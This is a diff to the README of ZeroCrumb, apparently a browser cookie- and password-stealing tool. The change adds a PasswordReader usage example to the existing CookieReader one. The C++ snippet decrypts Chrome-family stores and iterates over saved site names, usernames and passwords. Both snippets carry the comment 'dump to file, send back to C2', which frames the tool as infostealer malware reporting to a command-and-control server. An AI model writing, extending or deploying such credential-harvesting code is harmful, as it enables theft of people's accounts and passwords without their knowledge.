@@ -30,7 +30,7 @@ Edge -> 2
 ```
 
 ## Code Usage
-ZeroCrumb provides an easy-to-use **CookieReader** class:
+ZeroCrumb provides an easy-to-use **CookieReader** & **PasswordReader** classes:
 ```cpp
     auto reader = new CookieReader(cookiesPath.c_str(), key);
 
@@ -45,6 +45,23 @@ ZeroCrumb provides an easy-to-use **CookieReader** class:
         string cookieValue = cookie->cookie;
         // dump to file, send back to C2, etc...
     }
+```
+
+```
+    auto passwordsPath = browserConfig.passwordsPath;
+    auto reader = new PasswordReader(passwordsPath.c_str(), key);
+
+    reader->initSqliteDb();
+    reader->prepare(queries::passwords);
+    reader->populatePasswords();
+
+    for (auto& password : reader->passwords) {
+
+      auto name = password->name;
+      auto site = password->site;
+      auto passwordValue = password->password;
+      // dump to file, send back to C2, etc...
+}
 ```
 
 ## Depedencies
